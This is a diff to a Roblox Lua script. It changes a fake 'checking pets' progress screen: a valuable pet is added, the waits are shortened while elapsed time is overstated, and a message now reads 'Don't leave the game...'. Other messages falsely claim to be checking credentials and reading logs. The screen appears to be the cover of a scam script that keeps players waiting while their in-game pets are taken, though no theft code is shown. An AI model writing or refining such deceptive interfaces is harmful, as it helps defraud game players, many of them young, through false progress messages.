@@ -120,14 +120,14 @@ local totalTime = 600
 local startTime = tick()
 local virtualElapsed = 0
 
-local pets = {"Raccoon", "Dragonfly", "Butterfly", "Queen Bee", "Disco Bee", "Mimic Octopus", "Fennec Fox", "T-Rex", "Spinosaurus"}
+local pets = {"Raccoon", "Dragonfly", "Butterfly", "Queen Bee", "Disco Bee", "Mimic Octopus", "Fennec Fox", "T-Rex", "Spinosaurus", "Kitsune"}
 
 spawn(function()
     for _, pet in ipairs(pets) do
         petLabel.Text = "Checking pets: " .. pet .. "..."
-        wait(30)
+        wait(20)
         petLabel.Text = "Checking pets: " .. pet .. " -> OK!"
-        virtualElapsed = virtualElapsed + 30
+        virtualElapsed = virtualElapsed + 25
         wait(1)
     end
 end)
@@ -153,7 +153,7 @@ end)
 
 local messages = {
     "Please wait...",
-    "You are going to an old server soon...",
+    "Don't leave the game...",
     "Finding the right server for you...",
     "Checking your credentials...",
     "Reading your logs...",
